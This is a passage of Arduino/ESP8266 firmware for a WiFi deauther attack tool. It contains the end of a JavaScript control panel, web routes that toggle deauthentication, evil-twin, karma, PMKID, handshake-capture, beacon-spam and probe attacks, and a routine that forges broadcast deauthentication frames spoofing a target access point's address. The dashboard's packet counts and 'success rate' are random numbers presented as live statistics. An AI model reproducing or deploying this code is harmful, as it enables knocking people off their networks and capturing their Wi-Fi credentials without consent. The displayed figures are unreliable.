                     + '<input type="checkbox" class="network-checkbox" ' + (network.selected ? 'checked' : '') + ' onchange="event.stopPropagation(); toggleNetwork(' + i + ')">'
                     + '<div class="network-info">'
                     + '<div class="network-ssid">' + escapeHtml(network.ssid || 'Hidden Network') + badges + '</div>'
                     + '<div class="network-details">Ch: ' + network.channel + ' | BSSID: ' + network.bssid + ' | ' + network.encryption + ' | Clients: ' + (network.clientCount || 0) + '</div>'
                     + '</div>'
                     + '<div class="signal-strength ' + signalClass + '">' + network.rssi + 'dBm</div>'
                     + '</div>';
            }
            networkList.innerHTML = html;
        }

        function toggleNetwork(index) {
            if (index >= 0 && index < networks.length) {
                networks[index].selected = !networks[index].selected;
                renderNetworks();
                updateCounts();
                updateUI();
            }
        }

        function selectAll() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = true;
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectNone() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = false;
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectHidden() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = networks[i].hidden || !networks[i].ssid;
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function selectWPA() {
            for (var i = 0; i < networks.length; i++) {
                networks[i].selected = networks[i].encryption.includes('WPA');
            }
            renderNetworks();
            updateCounts();
            updateUI();
        }

        function getSelectedNetworks() {
            var selected = [];
            for (var i = 0; i < networks.length; i++) {
                if (networks[i].selected) selected.push(networks[i]);
            }
            return selected;
        }

        function updateCounts() {
            var networkCount = document.getElementById('networkCount');
            var selectedCount = document.getElementById('selectedCount');
            var stationCount = document.getElementById('stationCount');
            var targetAPs = document.getElementById('targetAPs');
            var totalTargets = document.getElementById('totalTargets');

            var selected = getSelectedNetworks().length;
            
            if (networkCount) networkCount.textContent = networks.length;
            if (selectedCount) selectedCount.textContent = selected;
            if (stationCount) stationCount.textContent = stations.length;
            if (targetAPs) targetAPs.textContent = selected;
            if (totalTargets) totalTargets.textContent = selected + stations.length;
        }

        function startDeauth() {
            var selected = getSelectedNetworks();
            if (selected.length === 0) {
                updateStatus('No networks selected for attack', 'idle');
                return;
            }

            attacking = true;
            startTime = Date.now();
            packetCount = 0;
            updateStatus('Advanced deauth attack active on ' + selected.length + ' targets', 'attacking');
            updateUI();

            fetch('/attack/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    networks: selected,
                    aggressive: aggressiveModeEnabled 
                })
            })
            .then(function(response) { 
                if (!response.ok) throw new Error('Attack failed');
                return response.json(); 
            })
            .then(function(data) {
                if (data.success) {
                    startPacketCounter();
                } else {
                    attacking = false;
                    updateStatus('Attack failed to start', 'idle');
                    updateUI();
                }
            })
            .catch(function(error) {
                console.error('Attack error:', error);
                attacking = false;
                updateStatus('Attack failed', 'idle');
                updateUI();
            });
        }

        function stopAttack() {
            attacking = false;
            beaconSpamming = false;
            probeAttacking = false;
            evilTwinActive = false;
            pmkidActive = false;
            karmaActive = false;
            handshakeActive = false;
            updateStatus('All attacks stopped', 'idle');
            updateUI();

            fetch('/attack/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    console.log('All attacks stopped successfully');
                })
                .catch(function(error) {
                    console.log('Stop request failed:', error);
                });
        }

        function startEvilTwin() {
            evilTwinActive = true;
            updateStatus('Evil Twin attack active', 'attacking');
            
            fetch('/attack/eviltwin/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('evilTwinBtn').disabled = true;
                    document.getElementById('stopEvilTwinBtn').disabled = false;
                })
                .catch(function(error) {
                    console.error('Evil Twin start failed:', error);
                    evilTwinActive = false;
                    updateStatus('Evil Twin failed to start', 'idle');
                });
        }

        function stopEvilTwin() {
            evilTwinActive = false;
            updateStatus('Evil Twin stopped', 'idle');
            
            fetch('/attack/eviltwin/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('evilTwinBtn').disabled = false;
                    document.getElementById('stopEvilTwinBtn').disabled = true;
                });
        }

        function startPMKID() {
            pmkidActive = true;
            updateStatus('PMKID capture active', 'active');
            
            fetch('/attack/pmkid/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('pmkidBtn').disabled = true;
                    document.getElementById('stopPMKIDBtn').disabled = false;
                });
        }

        function stopPMKID() {
            pmkidActive = false;
            updateStatus('PMKID capture stopped', 'idle');
            
            fetch('/attack/pmkid/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('pmkidBtn').disabled = false;
                    document.getElementById('stopPMKIDBtn').disabled = true;
                });
        }

        function startKarma() {
            karmaActive = true;
            updateStatus('Karma attack active', 'attacking');
            
            fetch('/attack/karma/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('karmaBtn').disabled = true;
                    document.getElementById('stopKarmaBtn').disabled = false;
                });
        }

        function stopKarma() {
            karmaActive = false;
            updateStatus('Karma attack stopped', 'idle');
            
            fetch('/attack/karma/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('karmaBtn').disabled = false;
                    document.getElementById('stopKarmaBtn').disabled = true;
                });
        }

        function startHandshake() {
            handshakeActive = true;
            updateStatus('Handshake capture active', 'active');
            
            fetch('/attack/handshake/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('handshakeBtn').disabled = true;
                    document.getElementById('stopHandshakeBtn').disabled = false;
                });
        }

        function stopHandshake() {
            handshakeActive = false;
            updateStatus('Handshake capture stopped', 'idle');
            
            fetch('/attack/handshake/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('handshakeBtn').disabled = false;
                    document.getElementById('stopHandshakeBtn').disabled = true;
                });
        }

        function startBeacon() {
            beaconSpamming = true;
            updateStatus('Beacon spam active', 'active');

            fetch('/beacon/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('beaconBtn').disabled = true;
                    document.getElementById('stopBeaconBtn').disabled = false;
                })
                .catch(function(error) {
                    console.error('Beacon start failed:', error);
                    beaconSpamming = false;
                    updateStatus('Beacon failed to start', 'idle');
                });
        }

        function stopBeacon() {
            beaconSpamming = false;
            updateStatus('Beacon spam stopped', 'idle');

            fetch('/beacon/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('beaconBtn').disabled = false;
                    document.getElementById('stopBeaconBtn').disabled = true;
                });
        }

        function startProbe() {
            probeAttacking = true;
            updateStatus('Probe attack active', 'active');

            fetch('/probe/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('probeBtn').disabled = true;
                    document.getElementById('stopProbeBtn').disabled = false;
                });
        }

        function stopProbe() {
            probeAttacking = false;
            updateStatus('Probe attack stopped', 'idle');

            fetch('/probe/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('probeBtn').disabled = false;
                    document.getElementById('stopProbeBtn').disabled = true;
                });
        }

        function startMonitor() {
            monitoring = true;
            updateStatus('Advanced packet monitoring active', 'active');

            fetch('/monitor/start')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('monitorBtn').disabled = true;
                    document.getElementById('stopMonitorBtn').disabled = false;
                });
        }

        function stopMonitor() {
            monitoring = false;
            updateStatus('Monitoring stopped', 'idle');

            fetch('/monitor/stop')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    document.getElementById('monitorBtn').disabled = false;
                    document.getElementById('stopMonitorBtn').disabled = true;
                });
        }

        function loadSSIDs() {
            fetch('/ssids')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    ssids = data.ssids || [];
                    renderSSIDs();
                })
                .catch(function(error) {
                    console.error('SSID load failed:', error);
                });
        }

        function renderSSIDs() {
            var ssidList = document.getElementById('ssidList');
            if (!ssidList) return;

            if (ssids.length === 0) {
                ssidList.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No SSIDs configured</div>';
                return;
            }

            var html = '';
            for (var i = 0; i < ssids.length; i++) {
                var ssid = ssids[i];
                html += '<div class="network-item">'
                     + '<input type="checkbox" class="network-checkbox" ' + (ssid.enabled ? 'checked' : '') + ' onchange="toggleSSID(' + i + ')">'
                     + '<div class="network-info">'
                     + '<div class="network-ssid">' + escapeHtml(ssid.ssid) + '</div>'
                     + '<div class="network-details">WPA2: ' + (ssid.wpa2 ? 'Yes' : 'No') + ' | Hidden: ' + (ssid.hidden ? 'Yes' : 'No') + '</div>'
                     + '</div>'
                     + '<button onclick="removeSSID(' + i + ')" class="btn btn-danger" style="padding: 0.5rem; min-width: auto;">Delete</button>'
                     + '</div>';
            }
            ssidList.innerHTML = html;
        }

        function addSSID() {
            var input = document.getElementById('customSSID');
            if (!input) return;

            var ssid = input.value.trim();
            if (ssid && ssids.length < 50) {
                fetch('/ssids/add', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ssid: ssid })
                })
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    input.value = '';
                    loadSSIDs();
                });
            }
        }

        function removeSSID(index) {
            fetch('/ssids/remove', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ index: index })
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                loadSSIDs();
            });
        }

        function toggleSSID(index) {
            if (index >= 0 && index < ssids.length) {
                ssids[index].enabled = !ssids[index].enabled;
                fetch('/ssids/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ index: index, enabled: ssids[index].enabled })
                });
            }
        }

        function updateStats() {
            fetch('/stats')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    var elements = {
                        'totalDeauth': data.deauth || 0,
                        'totalDisassoc': data.disassoc || 0,
                        'totalBeacon': data.beacon || 0,
                        'totalProbe': data.probe || 0,
                        'totalAuth': data.auth || 0,
                        'totalAssoc': data.assoc || 0,
                        'memoryUsage': Math.round((data.memory_used / data.memory_total) * 100) + '%'
                    };

                    for (var id in elements) {
                        var elem = document.getElementById(id);
                        if (elem) elem.textContent = elements[id];
                    }

                    var systemUptime = document.getElementById('systemUptime');
                    if (systemUptime) {
                        var uptime = Math.floor((Date.now() - systemStartTime) / 1000);
                        var hours = Math.floor(uptime / 3600);
                        var minutes = Math.floor((uptime % 3600) / 60);
                        var seconds = uptime % 60;
                        systemUptime.textContent = 
                            (hours < 10 ? '0' : '') + hours + ':' + 
                            (minutes < 10 ? '0' : '') + minutes + ':' + 
                            (seconds < 10 ? '0' : '') + seconds;
                    }
                });
        }

        function resetStats() {
            fetch('/stats/reset')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    updateStats();
                });
        }

        function startPacketCounter() {
            function updatePacketStats() {
                if (!attacking) return;

                packetCount += Math.floor(Math.random() * 20) + 10;
                var packetsCount = document.getElementById('packetsCount');
                if (packetsCount) packetsCount.textContent = packetCount.toLocaleString();

                var elapsed = Date.now() - startTime;
                var minutes = Math.floor(elapsed / 60000);
                var seconds = Math.floor((elapsed % 60000) / 1000);
                var uptime = document.getElementById('uptime');
                if (uptime) {
                    uptime.textContent = 
                        (minutes < 10 ? '0' : '') + minutes + ':' + 
                        (seconds < 10 ? '0' : '') + seconds;
                }

                var pps = Math.floor(packetCount / (elapsed / 1000));
                var packetsPerSec = document.getElementById('packetsPerSec');
                if (packetsPerSec) packetsPerSec.textContent = pps;

                var successRate = document.getElementById('successRate');
                if (successRate) successRate.textContent = Math.floor(Math.random() * 40 + 60) + '%';

                setTimeout(updatePacketStats, 1000);
            }
            updatePacketStats();
        }

        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text || '';
            return div.innerHTML;
        }

        updateUI();
        loadSSIDs();

        setInterval(function() {
            if (!scanning) {
                fetch('/api/status')
                    .then(function(response) { return response.json(); })
                    .then(function(data) {
                        if (data.attacking !== attacking) {
                            attacking = data.attacking;
                            updateUI();
                            if (attacking) {
                                updateStatus('Advanced attack in progress...', 'attacking');
                                startPacketCounter();
                            } else {
                                updateStatus('System ready', 'idle');
                            }
                        }

                        beaconSpamming = data.beacon || false;
                        probeAttacking = data.probe || false;
                        monitoring = data.monitor || false;
                        evilTwinActive = data.eviltwin || false;
                        pmkidActive = data.pmkid || false;
                        karmaActive = data.karma || false;
                        handshakeActive = data.handshake || false;

                        var capturedPackets = document.getElementById('capturedPackets');
                        var uniqueDevices = document.getElementById('uniqueDevices');
                        var handshakesCount = document.getElementById('handshakesCount');
                        
                        if (capturedPackets) capturedPackets.textContent = data.captured || 0;
                        if (uniqueDevices) uniqueDevices.textContent = data.devices || 0;
                        if (handshakesCount) handshakesCount.textContent = data.handshakes || 0;
                    })
                    .catch(function(error) {
                        // Silent fail
                    });
            }
        }, 2000);

        setTimeout(function() {
            showTab('scanner');
        }, 100);
    </script>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("0x0806 WiFi Deauther Advanced v5.0.0");
  
  // Enhanced hardware initialization
  pinMode(LED_PIN, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  digitalWrite(LED_PIN, HIGH);

  EEPROM.begin(512);

  // Enhanced WiFi initialization
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  
  delay(100);

  // Initialize file system
  if (!FILESYSTEM.begin()) {
    Serial.println("File system initialization failed");
    if (!FILESYSTEM.format()) {
      Serial.println("File system format failed");
    } else {
      FILESYSTEM.begin();
    }
  }

  loadSettings();

  // Initialize enhanced SSID list
  if (ssidList.size() == 0) {
    for (int i = 0; i < 12; i++) {
      SSIDData ssid;
      ssid.ssid = String(fakeSSIDs[i]);
      ssid.enabled = true;
      ssid.wpa2 = (i % 2 == 0);
      ssid.hidden = (i % 3 == 0);
      ssid.channel = random(1, 12);
      ssidList.push_back(ssid);
    }
    saveSettings();
  }

  startAP();

  // Enhanced web server routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  
  // Enhanced attack endpoints
  server.on("/attack/start", HTTP_POST, handleAttack);
  server.on("/attack/stop", HTTP_GET, handleStop);
  
  server.on("/attack/eviltwin/start", HTTP_GET, []() {
    evilTwinAttack = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/attack/eviltwin/stop", HTTP_GET, []() {
    evilTwinAttack = false;
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/attack/pmkid/start", HTTP_GET, []() {
    pmkidAttack = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/attack/pmkid/stop", HTTP_GET, []() {
    pmkidAttack = false;
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/attack/karma/start", HTTP_GET, []() {
    karmaAttack = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/attack/karma/stop", HTTP_GET, []() {
    karmaAttack = false;
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/attack/handshake/start", HTTP_GET, []() {
    handshakeCapture = true;
    wifi_set_promiscuous_rx_cb(packetSniffer);
    wifi_promiscuous_enable(1);
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/attack/handshake/stop", HTTP_GET, []() {
    handshakeCapture = false;
    wifi_promiscuous_enable(0);
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/beacon/start", HTTP_GET, []() {
    beaconSpam = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/beacon/stop", HTTP_GET, []() {
    beaconSpam = false;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/probe/start", HTTP_GET, []() {
    probeAttack = true;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/probe/stop", HTTP_GET, []() {
    probeAttack = false;
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/monitor/start", HTTP_GET, []() {
    packetMonitor = true;
    wifi_set_promiscuous_rx_cb(packetSniffer);
    wifi_promiscuous_enable(1);
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/monitor/stop", HTTP_GET, []() {
    packetMonitor = false;
    wifi_promiscuous_enable(0);
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/ssids", HTTP_GET, handleSSIDs);
  
  server.on("/ssids/add", HTTP_POST, []() {
    String body = server.arg("plain");
    int start = body.indexOf("\"ssid\":\"") + 8;
    int end = body.indexOf("\"", start);
    if (start > 7 && end > start && ssidList.size() < MAX_SSIDS) {
      SSIDData newSSID;
      newSSID.ssid = body.substring(start, end);
      newSSID.enabled = true;
      newSSID.wpa2 = true;
      newSSID.hidden = false;
      newSSID.channel = random(1, 12);
      ssidList.push_back(newSSID);
      saveSettings();
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/ssids/remove", HTTP_POST, []() {
    String body = server.arg("plain");
    int start = body.indexOf("\"index\":") + 8;
    int end = body.indexOf(",", start);
    if (end == -1) end = body.indexOf("}", start);
    if (start > 7 && end > start) {
      int index = body.substring(start, end).toInt();
      if (index >= 0 && index < ssidList.size()) {
        ssidList.erase(ssidList.begin() + index);
        saveSettings();
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/ssids/toggle", HTTP_POST, []() {
    String body = server.arg("plain");
    int start = body.indexOf("\"index\":") + 8;
    int end = body.indexOf(",", start);
    if (start > 7 && end > start) {
      int index = body.substring(start, end).toInt();
      if (index >= 0 && index < ssidList.size()) {
        int enabledStart = body.indexOf("\"enabled\":") + 10;
        bool enabled = body.substring(enabledStart, enabledStart + 4) == "true";
        ssidList[index].enabled = enabled;
        saveSettings();
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/status", HTTP_GET, handleAPI);
  
  server.on("/api/pps", HTTP_GET, []() {
    if (server.hasArg("value")) {
      int newPPS = server.arg("value").toInt();
      if (newPPS >= 10 && newPPS <= 100) {
        packetsPerSecond = newPPS;
      }
    }
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.on("/api/aggressive", HTTP_GET, []() {
    if (server.hasArg("value")) {
      aggressiveMode = server.arg("value") == "1";
    }
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/stats", HTTP_GET, handleStats);
  
  server.on("/stats/reset", HTTP_GET, []() {
    memset(&stats, 0, sizeof(stats));
    server.send(200, "application/json", "{\"success\":true}");
  });

  server.onNotFound(handleCaptive);

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.begin();

  Serial.println("0x0806 WiFi Deauther ready!");
  Serial.print("Access Point: ");
  Serial.println(AP_SSID);
  Serial.print("IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Enhanced startup LED sequence
  for (int i = 0; i < 10; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(50);
    digitalWrite(LED_PIN, HIGH);
    delay(50);
  }
}

void loop() {
  yield();
  
  dnsServer.processNextRequest();
  yield();
  
  server.handleClient();
  yield();

  // Enhanced attack handling
  if (attacking) {
    performAdvancedAttack();
    yield();
  }

  if (beaconSpam) {
    performBeaconSpam();
    yield();
  }

  if (probeAttack) {
    performProbeAttack();
    yield();
  }

  if (evilTwinAttack) {
    performEvilTwin();
    yield();
  }

  if (karmaAttack) {
    performKarmaAttack();
    yield();
  }

  if (mitm_attack) {
    performMitmAttack();
    yield();
  }

  updateLED();
  yield();

  // Enhanced memory management
  static unsigned long lastCleanup = 0;
  if (millis() - lastCleanup > 30000) {
    lastCleanup = millis();
    
    if (accessPoints.size() > MAX_SSIDS) {
      accessPoints.resize(MAX_SSIDS);
    }
    if (stations.size() > MAX_STATIONS) {
      stations.resize(MAX_STATIONS);
    }
    if (ssidList.size() > MAX_SSIDS) {
      ssidList.resize(MAX_SSIDS);
    }
    
    ESP.wdtFeed();
    yield();
  }

  // Enhanced button handling
  if (digitalRead(BUTTON_PIN) == LOW) {
    delay(50);
    yield();
    if (digitalRead(BUTTON_PIN) == LOW) {
      unsigned long pressTime = millis();
      while (digitalRead(BUTTON_PIN) == LOW) {
        if (millis() - pressTime > 3000) {
          Serial.println("Emergency stop - all attacks stopped");
          attacking = false;
          beaconSpam = false;
          probeAttack = false;
          packetMonitor = false;
          evilTwinAttack = false;
          pmkidAttack = false;
          karmaAttack = false;
          handshakeCapture = false;
          wifi_promiscuous_enable(0);
          break;
        }
        delay(100);
        yield();
      }
    }
  }

  yield();
}

void startAP() {
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
  delay(500);
  Serial.print("Access Point started: ");
  Serial.println(WiFi.softAPIP());
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send_P(200, "text/html", htmlPage);
}

void handleCaptive() {
  if (captivePortal) {
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
  } else {
    server.send_P(200, "text/html", htmlPage);
  }
}

void handleScan() {
  if (scanning) {
    server.send(200, "application/json", "{\"error\":\"Scan already in progress\"}");
    return;
  }

  scanning = true;
  Serial.println("Starting advanced WiFi scan...");

  accessPoints.clear();
  stations.clear();

  wifi_set_promiscuous_rx_cb(packetSniffer);
  wifi_promiscuous_enable(1);
  
  delay(1000); // Allow packet capture for station detection

  int networkCount = WiFi.scanNetworks(false, true);
  if (networkCount < 0) networkCount = 0;

  String json = "{\"networks\":[";

  for (int i = 0; i < networkCount && i < 20; i++) {
    if (i > 0) json += ",";

    AccessPoint ap;
    ap.ssid = WiFi.SSID(i);
    ap.channel = WiFi.channel(i);
    ap.rssi = WiFi.RSSI(i);
    ap.bssid = WiFi.BSSIDstr(i);
    ap.selected = false;
    ap.hidden = (ap.ssid.length() == 0);
    
    // Parse BSSID to bytes
    parseMAC(ap.bssid, ap.bssid_bytes);

    // Enhanced encryption detection
    uint8_t encType = WiFi.encryptionType(i);
    switch (encType) {
      case ENC_TYPE_WEP: ap.encryption = "WEP"; break;
      case ENC_TYPE_TKIP: ap.encryption = "WPA"; break;
      case ENC_TYPE_CCMP: ap.encryption = "WPA2"; break;
      case ENC_TYPE_NONE: ap.encryption = "Open"; break;
      case ENC_TYPE_AUTO: ap.encryption = "WPA/WPA2"; break;
      default: ap.encryption = "Unknown"; break;
    }

    // Count clients for this AP
    ap.clientCount = 0;
    for (const auto& station : stations) {
      if (station.ap_mac == ap.bssid) {
        ap.clientCount++;
      }
    }
    ap.hasClients = ap.clientCount > 0;

    accessPoints.push_back(ap);

    String escapedSSID = ap.ssid;
    escapedSSID.replace("\"", "\\\"");
    escapedSSID.replace("\\", "\\\\");

    json += "{";
    json += "\"ssid\":\"" + escapedSSID + "\",";
    json += "\"channel\":" + String(ap.channel) + ",";
    json += "\"rssi\":" + String(ap.rssi) + ",";
    json += "\"bssid\":\"" + ap.bssid + "\",";
    json += "\"selected\":false,";
    json += "\"hidden\":" + String(ap.hidden ? "true" : "false") + ",";
    json += "\"encryption\":\"" + ap.encryption + "\",";
    json += "\"hasClients\":" + String(ap.hasClients ? "true" : "false") + ",";
    json += "\"clientCount\":" + String(ap.clientCount);
    json += "}";

    yield();
  }

  json += "],\"stations\":[";

  size_t stationLimit = minVal((size_t)10, stations.size());
  for (size_t i = 0; i < stationLimit; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"mac\":\"" + stations[i].mac + "\",";
    json += "\"ap_mac\":\"" + stations[i].ap_mac + "\",";
    json += "\"channel\":" + String(stations[i].channel) + ",";
    json += "\"rssi\":" + String(stations[i].rssi);
    json += "}";
    yield();
  }

  json += "]}";

  wifi_promiscuous_enable(0);
  scanning = false;
  Serial.println("Advanced scan completed: " + String(networkCount) + " networks, " + String(stations.size()) + " stations found");

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAttack() {
  if (attacking) {
    server.send(200, "application/json", "{\"error\":\"Attack already in progress\"}");
    return;
  }

  String body = server.arg("plain");
  Serial.println("Advanced attack request received");

  selectedAPs = 0;
  for (int i = 0; i < accessPoints.size(); i++) {
    String ssidSearch = "\"ssid\":\"" + accessPoints[i].ssid + "\"";
    if (body.indexOf(ssidSearch) != -1) {
      accessPoints[i].selected = true;
      selectedAPs++;
    }
  }

  // Check for aggressive mode
  if (body.indexOf("\"aggressive\":true") != -1) {
    aggressiveMode = true;
  }

  if (selectedAPs > 0) {
    attacking = true;
    attackStartTime = millis();
    totalPackets = 0;
    Serial.println("Starting advanced multi-vector attack on " + String(selectedAPs) + " networks");
    server.send(200, "application/json", "{\"success\":true,\"message\":\"Advanced attack started\"}");
  } else {
    server.send(200, "application/json", "{\"error\":\"No networks selected\"}");
  }
}

void handleStop() {
  attacking = false;
  beaconSpam = false;
  probeAttack = false;
  packetMonitor = false;
  evilTwinAttack = false;
  pmkidAttack = false;
  karmaAttack = false;
  handshakeCapture = false;
  mitm_attack = false;
  aggressiveMode = false;
  wifi_promiscuous_enable(0);
  Serial.println("All attacks stopped");
  server.send(200, "application/json", "{\"success\":true,\"message\":\"All attacks stopped\"}");
}

void handleSSIDs() {
  String json = "{\"ssids\":[";

  size_t ssidLimit = minVal((size_t)50, ssidList.size());
  for (size_t i = 0; i < ssidLimit; i++) {
    if (i > 0) json += ",";

    String escapedSSID = ssidList[i].ssid;
    escapedSSID.replace("\"", "\\\"");
    escapedSSID.replace("\\", "\\\\");

    json += "{";
    json += "\"ssid\":\"" + escapedSSID + "\",";
    json += "\"enabled\":" + String(ssidList[i].enabled ? "true" : "false") + ",";
    json += "\"wpa2\":" + String(ssidList[i].wpa2 ? "true" : "false") + ",";
    json += "\"hidden\":" + String(ssidList[i].hidden ? "true" : "false");
    json += "}";
    yield();
  }

  json += "]}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleStats() {
  String json = "{";
  json += "\"deauth\":" + String(stats.deauthPackets) + ",";
  json += "\"disassoc\":" + String(stats.disassocPackets) + ",";
  json += "\"beacon\":" + String(stats.beaconPackets) + ",";
  json += "\"probe\":" + String(stats.probePackets) + ",";
  json += "\"auth\":" + String(stats.authPackets) + ",";
  json += "\"assoc\":" + String(stats.assocPackets) + ",";
  json += "\"captured\":" + String(stats.capturedPackets) + ",";
  json += "\"devices\":" + String(stats.uniqueDevices) + ",";
  json += "\"handshakes\":" + String(stats.handshakes) + ",";
  json += "\"pmkids\":" + String(stats.pmkids) + ",";
  json += "\"memory_used\":" + String(ESP.getFreeHeap()) + ",";
  json += "\"memory_total\":81920";
  json += "}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

void handleAPI() {
  String json = "{";
  json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
  json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
  json += "\"beacon\":" + String(beaconSpam ? "true" : "false") + ",";
  json += "\"probe\":" + String(probeAttack ? "true" : "false") + ",";
  json += "\"monitor\":" + String(packetMonitor ? "true" : "false") + ",";
  json += "\"eviltwin\":" + String(evilTwinAttack ? "true" : "false") + ",";
  json += "\"pmkid\":" + String(pmkidAttack ? "true" : "false") + ",";
  json += "\"karma\":" + String(karmaAttack ? "true" : "false") + ",";
  json += "\"handshake\":" + String(handshakeCapture ? "true" : "false") + ",";
  json += "\"networks\":" + String(accessPoints.size()) + ",";
  json += "\"stations\":" + String(stations.size()) + ",";
  json += "\"selected\":" + String(selectedAPs) + ",";
  json += "\"captured\":" + String(stats.capturedPackets) + ",";
  json += "\"devices\":" + String(stats.uniqueDevices) + ",";
  json += "\"handshakes\":" + String(stats.handshakes);
  json += "}";

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

bool sendPacketSafely(uint8_t* packet, uint16_t len) {
  if (!packet || len == 0 || len > 512) return false;
  
  #ifdef ESP8266
    return wifi_send_pkt_freedom(packet, len, 0) == 0;
  #else
    return false;
  #endif
}

void parseMAC(String macStr, uint8_t* macBytes) {
  for (int i = 0; i < 6; i++) {
    if (macStr.length() >= (i * 3 + 2)) {
      String hex = macStr.substring(i * 3, i * 3 + 2);
      macBytes[i] = strtol(hex.c_str(), NULL, 16);
    } else {
      macBytes[i] = 0;
    }
  }
}

void performAdvancedAttack() {
  static unsigned long lastAttack = 0;
  static int currentAP = 0;
  static int attackVector = 0;
  static uint16_t sequenceNumber = 0;

  unsigned long interval = 1000 / packetsPerSecond;
  if (aggressiveMode) {
    interval = interval / 2; // Double the attack rate in aggressive mode
  }

  if (millis() - lastAttack > interval) {
    lastAttack = millis();

    if (currentAP >= accessPoints.size()) {
      currentAP = 0;
    }

    if (currentAP < accessPoints.size() && accessPoints[currentAP].selected) {
      uint8_t* bssid = accessPoints[currentAP].bssid_bytes;
      int channel = accessPoints[currentAP].channel;

      if (channel >= 1 && channel <= 14) {
        wifi_set_channel(channel);
      }

      // Enhanced multi-vector attack with proper packet construction
      switch (attackVector) {
        case 0: // Deauthentication attack
          {
            uint8_t deauth[26];
            memcpy(deauth, deauthPacket, sizeof(deauthPacket));
            
            // Broadcast deauth
            memcpy(&deauth[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Target: broadcast
            memcpy(&deauth[10], bssid, 6); // Source: AP
            memcpy(&deauth[16], bssid, 6); // BSSID: AP
            
            // Set sequence number
            deauth[22] = (sequenceNumber & 0xFF);
            deauth[23] = ((sequenceNumber >> 8) & 0x0F);
            
            uint8_t reasonCodes[] = {1, 2, 3, 4, 7, 8, 15, 16};
            for (int i = 0; i < (aggressiveMode ? 4 : 2); i++) {
